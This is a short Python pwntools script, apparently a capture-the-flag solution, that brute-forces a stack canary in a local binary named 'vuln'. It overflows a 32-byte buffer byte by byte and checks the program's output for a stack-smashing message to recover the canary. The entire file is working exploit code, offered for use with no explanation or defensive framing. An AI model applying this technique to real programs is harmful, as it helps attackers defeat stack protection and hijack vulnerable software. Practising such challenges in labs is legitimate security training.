#!/usr/bin/env python

#file run from server and placed in ~/canary.py

from pwn import *

context.log_level = 'critical'

buf = 'a'*32
maxcanarylen = 4
canary = ''

for k in range(maxcanarylen):
	for j in range(33,127):
		p = process('./vuln')
		p.sendline(str(len(buf)+len(canary)+1))
		p.sendline(buf+canary+chr(j))
		ans=p.recvall()
		if not "Stack Smashing Detected" in ans:
			canary += chr(j)
			print "Found it!: " + chr(j)
			break;

print "Canary is: " + canary

